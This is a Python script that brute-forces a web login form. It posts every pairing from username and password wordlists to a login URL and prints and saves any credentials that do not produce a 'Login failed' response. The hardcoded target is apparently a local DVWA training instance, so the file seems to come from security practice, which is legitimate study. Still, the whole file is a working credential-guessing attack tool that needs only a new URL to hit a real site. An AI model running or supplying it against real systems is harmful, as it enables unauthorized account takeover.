#!/usr/bin/python3


import requests
from alive_progress import alive_bar

from dto.dto import UserData
from handlers.file_handler import read_data_from_file, write_data_to_file
from tools.utils import data_filer


def password_bruteforce(url: str, login: list[str], password: list[str], ) -> list[UserData]:
    total_variants = len(login) * len(password)
    data_loginform = {"username": "",
                      "password": "",
                      "Login": "submit"}
    loginform_success = []

    with alive_bar(total_variants, title='Processing') as bar:
        for name in login:
            for password_name in password:
                data_loginform["username"] = name
                data_loginform["password"] = password_name

                response = requests.post(url, data=data_loginform)

                bar()

                if 'Login failed' not in response.content.decode():
                    print(f'[+] Got the login and the password ==> {name} | {password_name}')
                    loginform_success.append(UserData(name, password_name))

    return loginform_success


def main(url: str, login: str, password: str, write_file: str):
    logline_dictionary = read_data_from_file(login)
    password_dictionary = read_data_from_file(password)
    loginform_success = password_bruteforce(url, logline_dictionary, password_dictionary)
    credentials = data_filer(loginform_success)
    print(write_data_to_file(credentials, write_file))


if __name__ == '__main__':
    # url, wordlist_file, filename_to_write = get_argparse()

    target_url = "http://10.0.2.12/dvwa/login.php"
    wordlist_password = "password_dictionaries/passwords.txt"
    wordlist_login = "password_dictionaries/login.txt"
    filename_to_write = "password_success"

    main(target_url, wordlist_login, wordlist_password, filename_to_write)
